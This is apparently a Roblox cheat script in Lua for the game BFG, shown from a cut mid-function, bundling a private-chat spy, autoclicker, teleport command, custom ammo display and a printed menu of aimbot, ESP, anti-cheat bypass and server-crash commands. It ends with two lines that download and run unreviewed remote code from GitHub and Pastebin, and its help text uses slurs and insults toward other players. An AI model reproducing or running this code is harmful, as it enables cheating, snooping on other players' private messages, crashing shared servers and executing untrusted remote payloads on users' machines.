				else
					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				end
			end
		end
	end
end
 
for _,p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)


local KeyHold = false

game:GetService("UserInputService").InputBegan:Connect(function(Key, Typing)
    if Typing then return end
    if Key.KeyCode == Enum.KeyCode.E then
        KeyHold = true
    end
end)

game:GetService("UserInputService").InputEnded:Connect(function(Key, Typing)
    if Typing then return end
    if Key.KeyCode == Enum.KeyCode.E then
        KeyHold = false
    end
end)

game:GetService("RunService").Stepped:Connect(function()
    if KeyHold then
        mouse1click(MOUSE_CLICK)
    end
end)

local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."goto" then

local player
    for i, plr in ipairs(game.Players:GetPlayers()) do
    if string.lower(plr.Name):sub(1, string.len(msg:sub(7))) == string.lower(msg:sub(7)) then
        player = plr.Name
    end
    end

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[player].HumanoidRootPart.CFrame
end
end)


local plr = game.Players.LocalPlayer
local Prefix = "!"

plr.Chatted:Connect(function(Cmd)
    Cmd = Cmd:lower()
    if Cmd == Prefix.."cmds" then

print("Bfg Weld Method Script And Other Random Shit, Made by Devour")
print("https://discord.gg/7ErzYpNzq8 To Get Updates For The Script")
print("Chat Commands Prefix is !")
print("========================================================")
print("Hotkeys :")
print("R - Resets Your Roblox Character")
print("F - Toggles Fly")
print("X - Toggles NoClip")
print("E - If You Hold E It Will Autoclick For You (FOR BFG)")
print("T - If Your Press T If You Example Reset Your Character You Will Get Spawned In The Same Place That You Reset")
print("========================================================")
print("Chat Commands")
print("[weld1/w1] Weld Method With A Diffrent Arm Pos Than Others")
print("[weld2/w2] Weld Method With A Diffrent Arm Pos Than Others")
print("[weld3/w3] Weld Method With A Diffrent Arm Pos Than Others")
print("[weld4/w4] Weld Method With A Diffrent Arm Pos Than Others")
print("[weld5/w5] Weld Method With A Diffrent Arm Pos Than Others")
print("[weld6/w6] Weld Method With A Diffrent Arm Pos Than Others")
print("[rj] Rejoins The Current Server Ur In")
print("[toolbypass/tb] Bypasses Ur Tool Amount")
print("[spamequips/ses] Spams Ur Shottys (FOR BFG)")
print("[spamequipg/seg] Spams Ur Glocks (FOR BFG)")
print("[unspamequip/unse] Stops Spamequpping Your Guns")
print("[re/reset] Resets Your ROBLOX Character")
print("[crash/cr} Crashes The Game")
print("[shottyw/sw] Welds Gun To Your Arm")
print("[shottyweld2/sw2] Welds Gun To Your Arm {Works Better If You Have Gun Out Before}")
print("[serverhop/sh] Serverhops duh")
print("[anticrash/ac] Stops Gay Chat Crash")
print("[antife/af] AntiFe Attempt")
print("[invis/iv] Invis Script Because Funny")
print("[antiaim/aa] AntiAim [RESET TO STOP]")
print("[antiafk/afk] AntiAfk For You Aids FEing Monkeys")
print("[open/close] Opens And Closes All Doors")
print("[shottyspam/ss] Spam Clicks Your Shotgun")
print("[glockspam/gs] Spam Clicks Your Glock")
print("[antigh/ag] Anti Ground Hit")
print("[bypass/bp] Bypasses Everything In The Game")
print("[unbypass/unbp] Unbypasses")
print("[noslow/ns] NoSlow {Shoot Whilst Walking}")
print("[fakelag/flag] Got Bored So Added A Useless FakeLag")
print("[unfakelag/unflag] Stops FakeLag")
print("[speedpunch/sp] Funny Fast Punch")
print("[unspeedpunch/unsp] Returns Punch Speed To Normal")
print("[dis/dc] Puts Devours Discord In Chat")
print("[cmds] Brings Up The Commands In Dev Console {Press F9}")
print("========================================================")
print("Command Bar Commands")
print("Command Bar Prefix: ;")
print("[flyspeed/fly] Changes Your FlySpeed")
print("[fly/togglefly/f] Turns On Fly")
print("[fieldofview/fov] Sets Your Fov")
print("[blink/b] Toggles Blink")
print("[esp/find] Esps A Monkey")
print("[unesp/unfind] UnEsps The Monkey")
print("[camlock/cam/cl/cml] Camlocks A Monkey")
print("[uncamlock/uncam/uncl/unclm] Uncamlocks A Monkey")
print("[aim/aimlock/aimbot/shoot] Aimlocks On A Monkey")
print("[unaim/uns/unaimbot/unshoot] Turns Off Aimlock")
print("[aimvelocity/av] Choose Your AimVelocity")
print("[noclip/nc/nclip] Toggles NoClip")
print("[bs/blinkspeed] Changes Your BlinkSpeed")
print("[aimpart/ap] Selects Your AimPart")
   game.StarterGui:SetCore("SendNotification", {
    Title = "Devour";
    Text = "Commands Loaded In Dev Console";
    Icon = "rbxassetid://2541869220";
    Duration = 4;
        })
end
end)


print("Bfg Weld Method Script With More Random Shit, Made by Devour [Devour#1264]")
print("https://discord.gg/7ErzYpNzq8 To Get Updates For The Script") 
print("Chat Commands Prefix is !")
print("========================================================")
print("Hotkeys :")
print("R - Resets Your Roblox Character")
print("F - Toggles Fly")
print("X - Toggles NoClip")
print("E - If You Hold E It Will Autoclick For You (FOR BFG)")
print("T - If Your Press T If You Example Reset Your Character You Will Get Spawned In The Same Place That You Reset")
print("========================================================")
print("Chat Commands")
print("[weld1/w1] Weld Method With A Diffrent Arm Pos Than Others")
print("[weld2/w2] Weld Method With A Diffrent Arm Pos Than Others")
print("[weld3/w3] Weld Method With A Diffrent Arm Pos Than Others")
print("[weld4/w4] Weld Method With A Diffrent Arm Pos Than Others")
print("[weld5/w5] Weld Method With A Diffrent Arm Pos Than Others")
print("[weld6/w6] Weld Method With A Diffrent Arm Pos Than Others")
print("[rj] Rejoins The Current Server Ur In")
print("[toolbypass/tb] Bypasses Ur Tool Amount")
print("[spamequips/ses] Spams Ur Shottys (FOR BFG)")
print("[spamequipg/seg] Spams Ur Glocks (FOR BFG)")
print("[unspamequip/unse] Stops Spamequpping Your Guns")
print("[re/reset] Resets Your ROBLOX Character")
print("[crash/cr} Crashes The Game")
print("[shottyw/sw] Welds Gun To Your Arm")
print("[shottyweld2/sw2] Welds Gun To Your Arm {Works Better If You Have Gun Out Before}")
print("[serverhop/sh] Serverhops duh")
print("[anticrash/ac] Stops Gay Chat Crash")
print("[antife/af] AntiFe Attempt")
print("[invis/iv] Invis Script Because Funny")
print("[antiaim/aa] AntiAim [RESET TO STOP]")
print("[antiafk/afk] AntiAfk For You Aids FEing Monkeys")
print("[open/close] Opens And Closes All Doors")
print("[shottyspam/ss] Spam Clicks Your Shotgun")
print("[glockspam/gs] Spam Clicks Your Glock")
print("[antigh/ag] Anti Ground Hit Because Bored")
print("[bypass/bp] Bypasses Everything In The Game")
print("[unbypass/unbp] Unbypasses")
print("[noslow/ns] NoSlow {Shoot Whilst Walking}")
print("[fakelag/flag] Got Bored So Added A Useless FakeLag")
print("[unfakelag/unflag] Stops FakeLag")
print("[speedpunch/sp] Funny Fast Punch")
print("[unspeedpunch/unsp] Returns Punch Speed To Normal")
print("[dis/dc] Puts Devours Discord In Chat")
print("[cmds] Brings Up The Commands In Dev Console {Press F9}")
print("========================================================")
print("Command Bar Commands")
print("Command Bar Prefix: ;")
print("[flyspeed/fly] Changes Your FlySpeed")
print("[fly/togglefly/f] Turns On Fly")
print("[fieldofview/fov] Sets Your Fov")
print("[blink/b] Toggles Blink")
print("[esp/find] Esps A Monkey")
print("[unesp/unfind] UnEsps The Monkey")
print("[camlock/cam/cl/cml] Camlocks A Monkey")
print("[uncamlock/uncam/uncl/unclm] Uncamlocks A Monkey")
print("[aim/aimlock/aimbot/shoot] Aimlocks On A Monkey")
print("[unaim/uns/unaimbot/unshoot] Turns Off Aimlock")
print("[aimvelocity/av] Choose Your AimVelocity")
print("[noclip/nc/nclip] Toggles NoClip")
print("[bs/blinkspeed] Changes Your BlinkSpeed")
print("[aimpart/ap] Selects Your AimPart")
print("[view/spy] Views A Players")
print("[unview/unspy] Stops Viewing A Playing")
print("========================================================")


local ScreenGui = Instance.new("ScreenGui")
local ClipsTxt = Instance.new("TextLabel")
local BulletsTxt = Instance.new("TextLabel")
ScreenGui.Parent = game.CoreGui
ClipsTxt.Name = "ClipsTxt"
ClipsTxt.Parent = ScreenGui
ClipsTxt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ClipsTxt.BackgroundTransparency = 1.000
ClipsTxt.Position = UDim2.new(0, 0, 0.10211359, 0)
ClipsTxt.Size = UDim2.new(0, 200, 0, 50)
ClipsTxt.Font = Enum.Font.Gotham
ClipsTxt.Text = "Clips:"
ClipsTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
ClipsTxt.TextSize = 24.000
ClipsTxt.Visible = false

BulletsTxt.Name = "BulletsTxt"
BulletsTxt.Parent = ScreenGui
BulletsTxt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BulletsTxt.BackgroundTransparency = 1.000
BulletsTxt.Position = UDim2.new(0, 0, 0.14211359, 0)
BulletsTxt.Size = UDim2.new(0, 200, 0, 50)
BulletsTxt.Font = Enum.Font.Gotham
BulletsTxt.Text = "Bullets:"
BulletsTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
BulletsTxt.TextSize = 24.000
BulletsTxt.Visible = false
game.Players.LocalPlayer.PlayerGui.HUD:FindFirstChild("Ammo"):Destroy()

function CustomAmmoUI()
local gunequipped = false
for _,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
	if v:IsA("Tool") then
        if v ~= nil then	
v.Equipped:Connect(function()
if v:FindFirstChild("Clips") and v:FindFirstChild("Ammo") then		
wait(.1)
ClipsTxt.Text = "Clips:"
BulletsTxt.Text = "Bullets:"		
gunequipped = true	
BulletsTxt.Visible = true
ClipsTxt.Visible = true
repeat	
BulletsTxt.Text = "Bullets: "..v:FindFirstChild("Ammo").Value..""
ClipsTxt.Text = "Clips: "..v:FindFirstChild("Clips").Value..""
game:GetService("RunService").Heartbeat:Wait()	
until gunequipped == false
else
return nil			
end				
end)
v.Unequipped:Connect(function()
ClipsTxt.Text = "Clips:"
BulletsTxt.Text = "Bullets:"
gunequipped = false	
BulletsTxt.Visible = false
ClipsTxt.Visible = false
end)
end			
end	
end	
end
CustomAmmoUI()
game.Players.LocalPlayer.Character.Humanoid.Died:Connect(function()
game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
end)
game.Players.LocalPlayer.CharacterAdded:Connect(function()	
local hud = game.Players.LocalPlayer.PlayerGui:WaitForChild("HUD")
hud.Ammo:Destroy()
wait(1)
CustomAmmoUI()	
end)

if executed == true then
local speak = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
wait(1)
speak:FireServer("Devour's BFG Script Executed","All")
wait(0.5)
speak:FireServer("Have Fun Making Apes Cry With The Other Dumb Things","All")
end

coroutine.wrap(MBXT_fake_script)()
local function ZTIU_fake_script() -- FirstScript.Draggable script 
	local script = Instance.new('LocalScript', FirstScript)

	frame = script.Parent.main
	frame.Draggable = true
	frame.Active = true
	frame.Selectable = true
end
coroutine.wrap(ZTIU_fake_script)()
local function ZCAEOFU_fake_script() -- Open.OpenScript 
	local script = Instance.new('LocalScript', Open)

	script.Parent.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.PlayerGui.FirstScript.main.Visible = true
	end)
end
local executed = true

coroutine.wrap(ZCAEOFU_fake_script)()
loadstring(game:HttpGet("https://raw.githubusercontent.com/DrPoppadopolist/DrPoppaV3/master/Script",true))()
loadstring(game:HttpGet(('https://pastebin.com/raw/vWw7UjPe'),true))()